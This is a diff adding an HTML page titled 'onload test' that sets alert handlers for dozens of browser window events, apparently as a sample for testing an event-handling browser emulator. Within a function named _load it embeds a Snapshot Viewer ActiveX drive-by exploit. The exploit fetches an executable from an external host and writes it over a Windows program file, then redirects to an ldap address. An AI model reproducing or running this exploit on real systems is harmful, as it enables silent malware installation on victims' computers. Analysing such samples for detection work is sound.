@@ -1,0 +1,227 @@
+<html>  
+<head>  
+      
+<title>onload test</title>     
+<script type="text/javascript">
+
+alert(window.innerWidth);
+alert(window.innerHeigth);
+alert(this);
+
+window.onabort = abort;
+window.onbeforeunload = beforeunload;
+window.onblur = blur;
+window.onchange = change;
+window.onclick = click;
+window.onclose = close;
+window.oncontextmenu = contextmenu;
+window.ondragdrop = dragdrop;
+window.onerror = error;
+window.onfocus = focus;
+window.onhashchange = hashchange;
+window.onkeydown = keydown;
+window.onkeypress = keypress;
+window.onkeyup = keyup;
+window.onload = load;
+window.onmousedown = mousedown;
+window.onmousemove = mousemove;
+window.onmouseout = mouseout;
+window.onmouseover = mouseover;
+window.onmouseup = mouseup;
+window.onmozorientation = mozorientation;
+window.onpaint = paint;
+window.onpopstate = popstate;
+window.onreset = reset;
+window.onresize = resize;
+window.onscroll = scroll;
+window.onselect = select;
+window.onsubmit = submit;
+window.onunload = unload;
+window.onpageshow = pageshow;
+window.onpagehide = pagehide;
+
+function foo()
+{
+	alert("Call to foo() detected!");
+}
+
+function _load()  
+{ 
+	try{
+		ret = new ActiveXObject("snpvw.Snapshot Viewer Control.1");
+		var arbitrary_file = 'http://paksusic.cn/nuc/exe.php';
+		var dest = 'C:/Program Files/Outlook Express/wab.exe';
+		document.write("<object classid='clsid:F0E42D60-368C-11D0-AD81-00A0C90DC8D9' id='attack'></object>");
+		attack.SnapshotPath = arbitrary_file;
+		setTimeout('window.location = "ldap://127.0.0.1"',2000);
+		attack.CompressedPath = dest;
+		attack.PrintSnapshot(arbitrary_file,dest);
+	} catch(e) 
+	{ }
+	alert("load event detected!");
+	foo();
+}
+
+function abort() {
+        alert("abort event detected!");
+        foo();
+}
+
+function beforeunload() {
+        alert("beforeunload event detected!");
+        foo();
+}
+
+function blur() {
+        alert("blur event detected!");
+        foo();
+}
+
+function change() {
+        alert("change event detected!");
+        foo();
+}
+
+function click() {
+        alert("click event detected!");
+        foo();
+}
+
+function close() {
+        alert("close event detected!");
+        foo();
+}
+
+function contextmenu() {
+        alert("contextmenu event detected!");
+        foo();
+}
+
+function dragdrop() {
+        alert("dragdrop event detected!");
+        foo();
+}
+
+function error() {
+        alert("error event detected!");
+        foo();
+}
+
+function focus() {
+        alert("focus event detected!");
+        foo();
+}
+
+function hashchange() {
+        alert("hashchange event detected!");
+        foo();
+}
+
+function keydown() {
+        alert("keydown event detected!");
+        foo();
+}
+
+function keypress() {
+        alert("keypress event detected!");
+        foo();
+}
+
+function keyup() {
+        alert("keyup event detected!");
+        foo();
+}
+
+function load() {
+        alert("load event detected!");
+        foo();
+}
+
+function mousedown() {
+        alert("mousedown event detected!");
+        foo();
+}
+
+function mousemove() {
+        alert("mousemove event detected!");
+        foo();
+}
+
+function mouseout() {
+        alert("mouseout event detected!");
+        foo();
+}
+
+function mouseover() {
+        alert("mouseover event detected!");
+        foo();
+}
+
+function mouseup() {
+        alert("mouseup event detected!");
+        foo();
+}
+
+function mozorientation() {
+        alert("mozorientation event detected!");
+        foo();
+}
+
+function paint() {
+        alert("paint event detected!");
+        foo();
+}
+
+function popstate() {
+        alert("popstate event detected!");
+        foo();
+}
+
+function reset() {
+	alert("reset event detected!");
+	foo();
+}
+
+function resize() {
+        alert("resize event detected!");
+        foo();
+}
+
+function scroll() {
+        alert("scroll event detected!");
+        foo();
+}
+
+function select() {
+        alert("select event detected!");
+        foo();
+}
+
+function submit() {
+        alert("submit event detected!");
+        foo();
+}
+
+function unload() {
+        alert("unload event detected!");
+        foo();
+}
+
+function pageshow() {
+        alert("pageshow event detected!");
+        foo();
+}
+
+function pagehide() {
+        alert("pagehide event detected!");
+        foo();
+}
+
+
+</script>  
+</head>  
+   
+<body>  
+<p>The load event fires when the document has finished loading!</p>  
+</body>  
+</html>  
